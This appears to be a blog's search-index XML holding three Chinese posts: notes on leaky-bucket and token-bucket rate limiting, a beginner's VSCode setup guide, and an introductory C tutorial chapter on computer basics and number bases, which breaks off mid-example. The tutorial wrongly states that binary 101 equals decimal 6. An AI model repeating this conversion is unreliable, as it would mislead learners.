<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>限流算法</title>
      <link href="/202405d328682204/"/>
      <url>/202405d328682204/</url>
      
        <content type="html"><![CDATA[<h1 id="漏桶算法">漏桶算法</h1><p><code>漏桶算法</code>  是最为简单的限流算法，原理类似一个容积一定的木桶，有水源向该木桶加入水，但是流入的数量不确定，任意时刻的流入速率也是随机；而木桶底部有一个固定大小的洞，以恒定的速率向外漏水；这样，桶中流出水的速率恒定，而当桶满了的时候，水会自然地溢出。</p><p>其中：桶中的水类比网络请求；流入的水代表新到达的请求，而流出的水代表被系统处理的请求。<br>可以看到：新到达的请求量以及频率是不确定的，而整个桶却能保持一定的最大容量，并且以恒定的速率处理请求（漏出水）；当桶满时，即系统满负载时，新到达的请求被自然丢弃，这样即可确保系统能够始终以恒定的速率处理请求。</p><p>实际实现中，漏桶可以使用一个恒定容量的队列实现，系统以恒定的速率从队列中取出一定数量的请求进行处理；而当队满时，新到达的请求被丢弃。</p><p>优点：</p><ul><li>（强制）保证稳定的流量控制，适用于流量稳定，没有或较少突发流量的场景</li><li>易于理解，实现简单</li></ul><p>缺点：</p><ul><li>速度相对稳定，缺乏弹性</li><li>由于保持稳定的处理速率，导致无法应对突发流量（例如秒杀活动）</li></ul><h1 id="令牌桶算法">令牌桶算法</h1><p>实际的网络应用中，常常存在着突发流量，此时 <code>漏桶算法</code> 便无法适应这种情况，<code>令牌桶算法</code> 能够在保持流量的平均传输速率时，也能允许一定的突发流量。</p><p><code>令牌桶算法</code> 中，存在一个以大小一定的 <code>令牌桶</code> ，用于存储一定数量的令牌，所有的数据都需要消耗令牌来放行；<br>而系统中有一个不断产生令牌的源，它向令牌桶中以恒定速率放入令牌。</p><p>而每一个数据包到达时，都要消耗与其大小相当数量的令牌；<br>如果桶中无令牌或令牌数量不足，则丢弃（或缓存）该数据包，否则将其放行（或处理）。</p><p>与 <code>漏桶算法</code> 不同，<code>令牌桶算法</code> 除了能够限制数据的平均传输速率外，还允许一定程度的突发传输。在突发流量的情况下爱，只要令牌桶中还存在足够的令牌，那么就允许不断传输数据，直到达到门限为止（取决于实际的配置）。</p><p>优点：</p><ul><li>保证稳定的平均传输速率，同时允许一定程度的突发流量<br>缺点：</li><li>内存消耗较大，例如对每一个用户都进行限制，就需要单独使用一个令牌桶，消耗大量资源</li><li>无法保证任一时刻速率的平滑性</li></ul><h1 id="固定窗口计数器算法">固定窗口计数器算法</h1>]]></content>
      
      
      <categories>
          
          <category> 后端技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VSCode基本配置教程</title>
      <link href="/20241059784280b9/"/>
      <url>/20241059784280b9/</url>
      
        <content type="html"><![CDATA[<p>PS：谁家好人初学用VSCode啊</p><h1 id="其他可用ide">其他可用IDE</h1><p>如果你觉得VSCode配置起来太过麻烦，可以考虑以下专事专办的IDE/工具：</p><ul><li>C：CLion（学生免费，高度支持C）、VS2022（msvc对C的支持是充话费送的，不过倒也能用）、小熊猫C++（devc的升级版）、Lightly（也挺不错的，就是打开慢）</li><li>C++：VS2022（C++必用VS）、CLion（也支持C++）</li><li>Python：Pycharm（一站式服务，免除一切烦恼）</li><li>Java：IDEA（世界上最好的JAVA IDE）</li><li>Go：Goland（一站式服务，免除一切烦恼）</li><li>前段三件套：WebStorm（一站式服务，免除一切烦恼）</li></ul><h1 id="下载安装">下载安装</h1><ol><li>不用我说了应该，官网在这：<br><a href="https://code.visualstudio.com/">Visual Studio Code - Code Editing. Redefined</a><br>我觉得各位应该能看懂英文，就不说了（点击<code>Download for Windows</code>）</li><li>下载好后运行安装程序，一路默认就好<br>注意：请勿使用中文路径，可以将软件安装到C盘之外的位置</li><li>启动！<br>能正常启动vscode就行</li></ol><h1 id="设置中文">设置中文</h1><p>按着图上的来，下载扩展包就好：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240821100945.png" alt="image.png|950"></p><p>现在，开始指定语言的开发环境配置，VSCode依赖各种插件，我们需要安装一系列插件来提供特定的支持。</p><h1 id="python环境配置">Python环境配置</h1><h2 id="安装插件">安装插件</h2><p>同样在商店中搜索，安装该插件：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240821103702.png" alt="image.png|775"><br>然后重新启动以进行下一步<br>重启后，按下 <code>F1</code> 或者 <code>ctrl+shift+p</code> 打开命令面板，键入 <code>python</code>，如果出现相关命令的提示则安装成功：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240821104214.png" alt="image.png|500"></p><h2 id="打开代码文件夹">打开代码文件夹</h2><p>选择一个合适的位置用来存放自己写的代码，例如 <code>D:/code/Python</code> ，创建好该文件夹后，在VSCode中打开该文件夹：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240821110038.png" alt="image.png|375"><br>打开文件夹后以进行下一步</p><h2 id="配置虚拟环境">配置虚拟环境</h2><p>python一般需要创建虚拟环境来进行隔离，以此减少因软件包版本冲突而可能引起的各种抽象问题，因此该步骤最好不要省略。</p><ol><li>此时假定你已经打开了形如 <code>D:/code/Python</code> 的某个文件夹，然后按下 <code>F1</code> 或者 <code>ctrl+shift+p</code> 打开命令面板，键入 <code>python</code>，找到该命令后按下回车：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240821110231.png" alt="image.png|500"></li><li>然后选择venv（使用Conda创建虚拟环境也可，本文以py自带的venv为例），按下回车：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240821110331.png" alt="image.png|575"></li><li>如果你有创建过，那么可以选择重新创建，然后回车即可：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240821110413.png" alt="image.png|575"></li><li>选择你电脑已经安装好的py解释器（确保你之前已经正确安装Python，本文略过安装步骤），然后回车：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240821110515.png" alt="image.png|575"></li><li>选择依赖，默认即可，直接回车：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240821110547.png" alt="image.png|575"></li><li>等待安装完成即可</li></ol><p>注意以下问题：</p><ul><li>如果发生pip升级错误，请关闭代理</li><li>如果关闭代理后pip仍然无法升级，请在命令行尝试 <code>python -m pip install --user --upgrade pip</code>后，重启VSCode再次尝试</li><li>如果仍然失败，请尝试运行 <code>.venv/Scripts</code>中的 <code>pip</code> ，如果报错 <code>No module named 'pip._internal'</code> ，请在命令行打开该文件夹（代码文件夹，并非<code>.venv</code>），使用<code>python -m venv .venv</code> 命令创建虚拟环境，成功后，重新来过，并在第3步选择现有环境即可</li></ul><h2 id="使用插件运行python文件">使用插件运行python文件</h2><p>在文件夹下创建一个测试代码：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240821113107.png" alt="image.png|500"><br>右键，选择在终端中运行Python即可：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240821113130.png" alt="image.png|500"><br>运行结果如下：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240821113210.png" alt="image.png|775"></p><h2 id="附：手动配置启动任务">附：手动配置启动任务</h2><p>在文件夹下创建 <code>.vscode</code> 文件夹，新建 <code>launch.json</code> ，输入配置信息：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240821114054.png" alt="image.png|775"></p><p>样板如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Python: Current File&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;debugpy&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;file&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;console&quot;</span><span class="punctuation">:</span> <span class="string">&quot;integratedTerminal&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;justMyCode&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>然后在左边点击调试运行按钮，再点击启动即可运行：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240821114420.png" alt="image.png|1000"></p><p>注：本节演示了单文件运行的配置方法，如果需要更加复杂的启动任务，同样这样自行配置即可，这里不再赘述。</p><h1 id="c-c-环境配置">C/C++环境配置</h1><p>我在文章 <a href="https://gngtwhh.space/2023-09-19-bb3b8099b657/">C语言教程-2-环境搭建 | WAHAHA’s blog</a> 中已经有详细介绍，点击链接查看即可。</p><h1 id="其他语言环境配置">其他语言环境配置</h1><p>// TODO: 有待添加</p><h1 id="魔改vscode">魔改VSCode</h1><h2 id="主题美化">主题美化</h2><p>首推 <code>Monokai</code>主题，安装对应扩展后，自行选择喜欢的主题即可：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240821115336.png" alt="image.png|875"><br>我选择的配色：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240821115526.png" alt="image.png|975"></p><p>其他推荐的主题还有： <code>Atom</code> 、 <code>One Dark pro</code>等</p><h2 id="ai插件">AI插件</h2><ul><li>Copilot：需要先去github申请学生包，激活Copilot，然后在VSCode安装插件并登录即可：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240821115839.png" alt="image.png|550"><br>另外还有 <code>GitHub Copilot Chat</code> 插件可以聊天。</li><li>CodeGeeX：登录即可，免费使用：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240821115924.png" alt="image.png|575"></li><li>通义灵码：不解释，比较不错：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240821120032.png" alt="image.png|575"></li><li>BIto：这个也不错：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240821120103.png" alt="image.png|575"></li></ul><h2 id="git相关">Git相关</h2><ul><li>GitHub Repositories：用于管理Git仓库<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240821120628.png" alt="image.png|275"></li><li>GitHub Pull Requests：用于管理Git拉取请求等<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240821120657.png" alt="image.png|275"></li><li>Git Graph：以图表的形式查看Git仓库<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240821120816.png" alt="image.png|725"></li></ul><h2 id="效率工具">效率工具</h2><ul><li>Project Manager：管理常用文件夹，一键切换工作区<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240821121043.png" alt="image.png|475"><br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240821121110.png" alt="image.png|325"></li><li>Text Toolbox：文本工具箱<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240821121202.png" alt="image.png|450"></li><li>Local History：记录本地文件历史记录，实现回滚，避免丢失</li><li>koroFileHeader：自动生成文件头部和函数注释</li></ul>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VSCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-1_1-计算机基础概述</title>
      <link href="/202476a8c85896e3/"/>
      <url>/202476a8c85896e3/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是计算机">什么是计算机</h1><blockquote><p>虽然在这里参考《计算机组成原理》一书也许有点为时尚早。。。</p></blockquote><p>一般意义下，<code>计算机</code>是一种能够接受输入信息，并进行处理产生输出结果的机器。<br>生活中常见的台式电脑、笔记本电脑、平板、手机都是计算机。</p><h2 id="冯-诺依曼计算机">冯·诺依曼计算机</h2><p>现在应用的大多数计算机遵循 <code>冯·诺依曼体系结构</code> ，即 <code>冯·诺依曼计算机</code> ，全称为 <code>冯·诺依曼存储程序数字计算机</code> ，其最大的特点是 <code>将程序存储起来，并且程序和数据保存在相同的存储器中，并不加以区分</code>。<br>除此之外，其他类型的计算机还有诸如模拟计算机、神经计算机、量子计算机、生化计算机等，它们处理信息的方式与存储程序计算机完全不同，这些概念不在本教程讨论范围内。</p><p>冯·诺依曼计算机有如下基本结构：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240815111340.png" alt="image.png|650"><br>5大组成分别负责以下职责：</p><ul><li>存储器：用于存储程序指令和数据</li><li>运算器：负责执行所有的算术运算和逻辑运算</li><li>控制器：管理指令的执行流程，控制程序运行</li><li>输入设备：用于向计算机输入信息（主要包括键盘和鼠标）</li><li>输出设备：用于输出计算机的运行结果（包括图形、文字、声音等各种形式）</li></ul><p>下图是存储程序计算机的结构图（截自《计算机组成原理》）：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240815104955.png" alt="image.png|450"></p><p>需要注意的是，现代计算机和传统的冯·诺依曼计算机有着不小的差别，例如现代计算机将运算器和控制器集成为 <code>CPU</code>等，这些内容并不是我们现在关注的重点，它们应该放到计算机组成原理课程上去学习。</p><h2 id="软件和硬件">软件和硬件</h2><p>一个完整的计算机系统由硬件系统和软件系统组成。</p><ul><li>软件系统：由在硬件上运行的程序和程序所操作的数据组成，包括系统软件（负责系统控制）和应用软件（负责实际应用计算）</li><li>硬件系统：组成计算机的各种物理设备，包括处理器、内存、硬盘、电源等等各种设备<br>在一般的程序开发中，我们更多地关注软件系统，而一定程度上忽略硬件系统的组成细节。</li></ul><h1 id="计算机的发展历史">计算机的发展历史</h1><ol><li>在电子计算机之前：算盘、机械计算器，主要用于算数运算，不能进行编程。</li><li>1642年，法国数学家布莱兹·帕斯卡（Blaise Pascal）发明了帕斯卡计算器，能够借助发条执行加减运算，仍然不能进行编程。</li><li>差分机：英国数学家查尔斯·巴贝奇（Charles Babbage）设计了差分机，能够自动计算构造数学表所需多项式的值。</li><li>分析机：巴贝奇设计了分析机，具有重要的历史地位，被认为是<code>通用计算机</code>的先驱。</li><li>机电式计算机：仍使用机械部件，但是使用电控制，典型的机器有马克 I 号等。</li><li>早期电子计算机：大名鼎鼎的ENIAC，是一台十进制真空管计算机，只能通过硬连线编程。</li><li>微机与PC机：再之后，计算机体量逐渐缩小，直到如今的家用电脑（微型机）。</li></ol><h1 id="什么是计算机程序">什么是计算机程序</h1><p>计算机程序是构成计算机软件系统的组成部分，计算机程序运行在硬件设备上。<br>计算机输入信息、处理计算信息、输出信息的所有过程全部依靠各种计算机程序进行控制。</p><ul><li>系统程序：对计算机系统进行控制，以保证系统的正常工作，并对应用程序的运行进行支持。</li><li>应用程序：负责完成计算机实际需要进行处理的任务，例如科学计算、音视频渲染、文件处理等任务。</li></ul><p>计算机程序需要程序员进行编写，编写好的程序就可以在特定的计算机（硬件）上运行并产生结果。</p><h1 id="什么是计算机语言">什么是计算机语言</h1><p>和人们写作一样，编写计算机程序同样需要使用特定的语言，这类语言称为 <code>编程语言</code>。（人们交流的语言是 <code>自然语言</code>）<br>随着计算机发展，编程语言也从 <code>机器语言</code>、<code>汇编语言</code>、<code>高级语言</code>逐步发展。</p><h2 id="机器语言">机器语言</h2><p>最早由于电子计算机的特点，特定的计算机指令必须由一串二进制代码表示，这样计算机才能进行识别并执行代码。<br>因此计算机程序就由二进制代码直接构成（例如高电平1低电平0，符合电路特点）。为了编写可以运行的程序，就必须根据特定的硬件电路去直接构造二进制代码。</p><p>这种由二进制串构成的代码被称为 <code>机器语言</code>，程序员需要根据计算机硬件支持的指令来直接构造程序，这个过程异常复杂，并且机器代码与特定硬件直接关联，几乎不可移植。</p><h2 id="汇编语言">汇编语言</h2><p>为了解决机器语言的问题，将二进制代码进行符号化，即将某一串二进制指令由一串符号（英文单词、数字）进行代替，例如 <code>add ax,1</code> 表示将 ax 寄存器的值加1。</p><p>这样，程序员无需直接构造二进制程序，可以使用汇编语言提供的“助记符”来编写程序，然后由特定的程序来转换成可运行的二进制程序。</p><h2 id="高级语言">高级语言</h2><p>尽管汇编语言大大简化了程序编写，但是它仍然十分低级，程序员仍然需要亲自考虑计算机的运行逻辑，效率依然低下，同时仍然有大量汇编指令需要记忆，移植性也依然很低。</p><p>人们希望能够将注意力更多地集中到解决问题本身，而不需要将程序设计的大量时间浪费在考虑操作计算机的运行逻辑上，高级编程语言就此出现。</p><p>所谓高级语言，指的是语法非常接近自然语言的编程语言，高级语言的表达更接近于一个正常人的思维。程序员可以根据自己的逻辑进行程序的编写。在程序编写完成后，使用特定的程序将其“翻译”为机器语言即可。</p><p>高级语言隐藏了计算机运行时复杂的底层逻辑和过程，让程序员能够将注意力更多地放在需要解决的问题本身上，大大提高了效率，而随着计算机的发展，编程语言也在不断地更新、演化。</p><p>本教程所讲述的 <code>C语言</code> 就是高级语言（其语法接近自然语言）的一种，也是最为重要的一门语言。</p><h1 id="计算机存储单位">计算机存储单位</h1><p>二进制有着其独特的性质，简单到可以由高低电平直接表示，因此极其适合应用于计算机。同样，计算机的数据存储也使用二进制。<br>数据是可以量化的，二进制数据有着特定的存储单位。</p><h2 id="bit-比特">bit-比特</h2><p>一个十进制数有0-9共十种状态，类似地，一个二进制数只有0或1这两种，因此只需要一个简单的标志即可进行区分，例如“开关的开合”、“电压的高低”、“硬币的正反”等等。</p><p>这一个标志的信息被称为 <code>bit（比特）</code> ，1 bit信息表示一个“非正即反”的数据。<br>在计算机中，<code>比特</code> 常常被称为 <code>位</code>，<code>1bit信息</code>即<code>1位信息</code>。<br>二进制数据正式由若干个比特组成的，但是比特这个单位太小了，当然，有着更大的数据单位。</p><h2 id="byte-字节">byte-字节</h2><p><code>字节（byte）</code>是计算机中最基本的存储单位，一个字节由8个相邻的二进制位（bit）组成。同时，字节是计算机中最小的操作单位（或者说是最小的可寻址单位）。</p><p>容易计算：1bit信息有 <code>2</code> 种状态，则1byte就有 <code>2^8=256</code> 种状态。<br>因此，假设用一字节数据存储无符号数（即非负整数），那么可存储的范围是 <code>0~255</code><br>注意：字节的缩写为大写的 <code>B</code>，而比特则常写为 <code>bit</code>。</p><h2 id="更大的存储单位">更大的存储单位</h2><p>从字节再向上，每 <code>2^10(即1024）</code> 一个单位，从小到大依次为KB、MB、GB、TB等等（还有更大的EB等等，此处省略），也就是说：<br>1024B（Byte）=1KB，1024KB=1MB，1024MB=1GB，1024GB=1TB<br>一般来讲，我们平时能用到的最大单位就是TB，例如1TB的固态硬盘指的就是这个单位。</p><h2 id="计算机中各设备的存储容量">计算机中各设备的存储容量</h2><p>以2024年的情况举例：</p><ul><li>现在的个人计算机，大多为64位机器，即地址长度为64位（8字节宽度）</li><li>64位机器的CPU中，一个寄存器的大小一般为64位（8字节）</li><li>一台微型计算机的内存大小一般在8GB~64GB上下</li><li>一张固态硬盘的大小一般在256GB~2TB上下</li></ul><p>此外，在计算机中，各种单位都是以2的幂次方增长的，而不是以我们熟悉的十进制，这样是为了让计算机更容易地进行处理。</p><h1 id="进制转换">进制转换</h1><p>人们日常使用的是十进制，即逢十进一，使用0~9这十个数字；<br>而在计算机科学中，一般使用二进制，即逢二进一，使用0~1这两个数字；<br>除此之外，由于二进制数过于冗长，还经常使用八进制（逢八进一，使用0~7这八个数字）或者十六进制（逢十六进一，使用0~9，A~F共十六个字符）计数；</p><p>不同进制之间可以根据特定的规则进行转换。无论几进制，无非是表示方式不同，在进制转换的过程中，数的大小是保持不变的。</p><h2 id="k进制数的特征">k进制数的特征</h2><p>考虑十进制数 <code>1234(10)</code>：<br>显然：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1234</mn><mo stretchy="false">(</mo><mn>10</mn><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn><mo>∗</mo><mn>1</mn><msup><mn>0</mn><mn>3</mn></msup><mo>+</mo><mn>2</mn><mo>∗</mo><mn>1</mn><msup><mn>0</mn><mn>2</mn></msup><mo>+</mo><mn>3</mn><mo>∗</mo><mn>1</mn><msup><mn>0</mn><mn>1</mn></msup><mo>+</mo><mn>4</mn><mo>∗</mo><mn>1</mn><msup><mn>0</mn><mn>0</mn></msup></mrow><annotation encoding="application/x-tex">1234(10)=1*10^3+2*10^2+3*10^1+4*10^0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">2</span><span class="mord">3</span><span class="mord">4</span><span class="mopen">(</span><span class="mord">1</span><span class="mord">0</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span></span></span></span></span></span></span></span>，即从右边最低位（记为第0位）开始，第 <code>i</code> 位的数乘以10的 <code>i</code> 次方，各项之和即为总的数<br>每一位数乘以的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mi>i</mi></msup></mrow><annotation encoding="application/x-tex">10^i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.824664em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.824664em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span></span></span></span></span></span></span> 被称为这一位的 <code>权重</code>，其中的 <code>10</code> 正是这个数所使用的进制。</p><p>类似地，考虑二进制数 <code>101(2)</code>：<br>同样：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>101</mn><mo stretchy="false">(</mo><mn>2</mn><mo stretchy="false">)</mo><mo>=</mo><mn>6</mn><mo stretchy="false">(</mo><mn>10</mn><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn><mo>∗</mo><msup><mn>2</mn><mn>2</mn></msup><mo>+</mo><mn>0</mn><mo>∗</mo><msup><mn>2</mn><mn>1</mn></msup><mo>+</mo><mn>1</mn><mo>∗</mo><msup><mn>2</mn><mn>0</mn></msup></mrow><annotation encoding="application/x-tex">101(2)=6(10)=1*2^2+0*2^1+1*2^0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mopen">(</span><span class="mord">2</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">6</span><span class="mopen">(</span><span class="mord">1</span><span class="mord">0</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span></span></span></span></span></span></span></span><br>其中101(2)就是十进制的6，这很容易得出。</p><p>这样的分解适用于任何k进制数，当然，分解后的多项式是基于十进制的。</p><h2 id="十进制转k进制">十进制转k进制</h2><p>十进制转二进制，使用除二求余的方法，每次除法得到的余数即为二进制数的每一个位。<br>注：一个数后跟括号，括号中的数字表示这个数使用的进制，例如 <code>7F(16)</code>  表示这是一个十六进制数 7F。</p><p>以 <code>6(10)</code> 